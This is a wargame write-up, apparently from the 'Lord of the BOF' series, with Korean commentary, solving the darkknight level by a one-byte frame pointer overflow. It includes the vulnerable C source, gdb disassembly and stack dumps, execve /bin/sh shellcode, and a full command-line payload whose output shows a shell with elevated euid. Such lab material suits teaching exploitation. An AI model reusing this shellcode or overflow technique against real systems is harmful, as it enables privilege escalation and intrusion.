# Level 11, Golem -> Darkknight

### darkknight.c

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - darkknight
        - FPO
*/

#include <stdio.h>
#include <stdlib.h>

void problem_child(char *src)
{
        char buffer[40];
        strncpy(buffer, src, 41);
        printf("%s\n", buffer);
}

main(int argc, char *argv[])
{
        if(argc<2){
                printf("argv error\n");
                exit(0);
        }

        problem_child(argv[1]);
}
```

### Analysis

#### Disassembling the "darkknight"

```
Dump of assembler code for function problem_child:
0x8048440 <problem_child>:      push   %ebp
0x8048441 <problem_child+1>:    mov    %ebp,%esp
0x8048443 <problem_child+3>:    sub    %esp,40
0x8048446 <problem_child+6>:    push   41
0x8048448 <problem_child+8>:    mov    %eax,DWORD PTR [%ebp+8]
0x804844b <problem_child+11>:   push   %eax
0x804844c <problem_child+12>:   lea    %eax,[%ebp-40]
0x804844f <problem_child+15>:   push   %eax
0x8048450 <problem_child+16>:   call   0x8048374 <strncpy>
0x8048455 <problem_child+21>:   add    %esp,12
0x8048458 <problem_child+24>:   lea    %eax,[%ebp-40]
0x804845b <problem_child+27>:   push   %eax
0x804845c <problem_child+28>:   push   0x8048500
0x8048461 <problem_child+33>:   call   0x8048354 <printf>
0x8048466 <problem_child+38>:   add    %esp,8
0x8048469 <problem_child+41>:   leave
0x804846a <problem_child+42>:   ret

Dump of assembler code for function main:
0x804846c <main>:       push   %ebp
0x804846d <main+1>:     mov    %ebp,%esp
0x804846f <main+3>:     cmp    DWORD PTR [%ebp+8],1
0x8048473 <main+7>:     jg     0x8048490 <main+36>
0x8048475 <main+9>:     push   0x8048504
0x804847a <main+14>:    call   0x8048354 <printf>
0x804847f <main+19>:    add    %esp,4
0x8048482 <main+22>:    push   0
0x8048484 <main+24>:    call   0x8048364 <exit>
0x8048489 <main+29>:    add    %esp,4
0x804848c <main+32>:    lea    %esi,[%esi*1]
0x8048490 <main+36>:    mov    %eax,DWORD PTR [%ebp+12]
0x8048493 <main+39>:    add    %eax,4
0x8048496 <main+42>:    mov    %edx,DWORD PTR [%eax]
0x8048498 <main+44>:    push   %edx
0x8048499 <main+45>:    call   0x8048440 <problem_child>
0x804849e <main+50>:    add    %esp,4
0x80484a1 <main+53>:    leave
0x80484a2 <main+54>:    ret
```

#### Estimated Stack Structure

```
|  BUFFER (40 bytes)      | [%ebp-40]
|  SFP#1 (4 bytes)        | [%ebp]
|  RET#1 (4 bytes)        | [%ebp+4]
|  *src (4 bytes)         | [%ebp+8]
|  SFP#2 (4 bytes)        | [%ebp+C]
|  RET#2 (4 bytes)        | [%ebp+10]
|  ARGC (4 bytes)         | [%ebp+14]
|  Pointer to ARGV[0]     | [%ebp+18]
```

#### Observed Stack Structure (bp at *problem_child+41)

```
Breakpoint 1 at 0x8048469
(gdb) run `python -c "print 'A'*40"`
Starting program: /home/golem/darkknight-cp `python -c "print 'A'*40"`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x8048469 in problem_child ()
(gdb) x/100x $esp
0xbffffac4:     0x41414141      0x41414141      0x41414141      0x41414141  -> char buffer[40]
0xbffffad4:     0x41414141      0x41414141      0x41414141      0x41414141  -> char buffer[40]
0xbffffae4:     0x41414141      0x41414141      0xbffffa00      0x0804849e  -> char buffer[40], SFP#1, RET
0xbffffaf4:     0xbffffc4f      0xbffffb18      0x400309cb      0x00000002  -> *src, SFP#2, RET, ARGC
0xbffffb04:     0xbffffb44      0xbffffb50      0x40013868      0x00000002
0xbffffb14:     0x08048390      0x00000000      0x080483b1      0x0804846c
0xbffffb24:     0x00000002      0xbffffb44      0x080482e4      0x080484dc
0xbffffb34:     0x4000ae60      0xbffffb3c      0x40013e90      0x00000002
0xbffffb44:     0xbffffc35      0xbffffc4f      0x00000000      0xbffffc78
0xbffffb54:     0xbffffc88      0xbffffca1      0xbffffcc0      0xbffffce2
0xbffffb64:     0xbffffced      0xbffffeb0      0xbffffecf      0xbffffeea
0xbffffb74:     0xbffffeff      0xbfffff1c      0xbfffff27      0xbfffff35
0xbffffb84:     0xbfffff3d      0xbfffff4e      0xbfffff58      0xbfffff66
0xbffffb94:     0xbfffff77      0xbfffff85      0xbfffff90      0xbfffffa1
0xbffffba4:     0x00000000      0x00000003      0x08048034      0x00000004
0xbffffbb4:     0x00000020      0x00000005      0x00000006      0x00000006
0xbffffbc4:     0x00001000      0x00000007      0x40000000      0x00000008
0xbffffbd4:     0x00000000      0x00000009      0x08048390      0x0000000b
0xbffffbe4:     0x000001ff      0x0000000c      0x000001ff      0x0000000d
0xbffffbf4:     0x000001ff      0x0000000e      0x000001ff      0x00000010
0xbffffc04:     0x0fabfbff      0x0000000f      0xbffffc30      0x00000000
0xbffffc14:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc24:     0x00000000      0x00000000      0x00000000      0x36383669
0xbffffc34:     0x6f682f00      0x672f656d      0x6d656c6f      0x7261642f
0xbffffc44:     0x696e6b6b      0x2d746867      0x41007063      0x41414141
```

### Exploit

#### How to pwn


Frame Pointer Overflow, [HOWTO](http://bob3rdnewbie.tistory.com/188)

어떻게 이런걸 생각해 내지 ㄹㅇ 개천재인듯

*Requirement* : SFP를 덮는 1바이트, sub-function

1. 버퍼에 NOP든 쉘코드든 아무튼 덮는다. 이 코드의 주소를 `&SHELLCODE`라고 하자.
2. SFP를 1바이트 덮어 씌울때, SFP가 `(&SHELLCODE+4)`를 가르키도록 만든다.
3. sub-function 스택 프레임에서 나갈때, EBP는 SFP 값, 즉 `(&SHELLCODE+4)`를 가르키게 된다.
4. main 함수 스택 프레임 해제할때, `mov esp, ebp`로 ESP, EBP 둘다 `(&SHELLCODE+4)`를 가르키게 된다.
5. `pop ebp`로 `*(&SHELLCODE+4)`를 넣는 동시에 ESP는 `&SHELLCODE`로 떨어진다.
6. `ret` (= `pop eip`) 하면 EIP에 `&SHELLCODE`를 넣을수 있다.

ㄷㄷ 개무섭다

#### Shellcode (24 bytes)

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

#### Final Payload

```
[golem@localhost golem]$ ./darkknight `python -c "print '\x90'*16+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'+'\xbc'"`
```

### Result

```
[golem@localhost golem]$ ./darkknight `python -c "print '\x90'*16+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'+'\xbc'"`
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒ᙰ
                                   ̀▒▒▒▒▒L▒▒▒▒▒▒▒        @
bash$ id
uid=511(golem) gid=511(golem) euid=512(darkknight) egid=512(darkknight) groups=511(golem)
bash$ my-pass
euid = 512
new attacker
```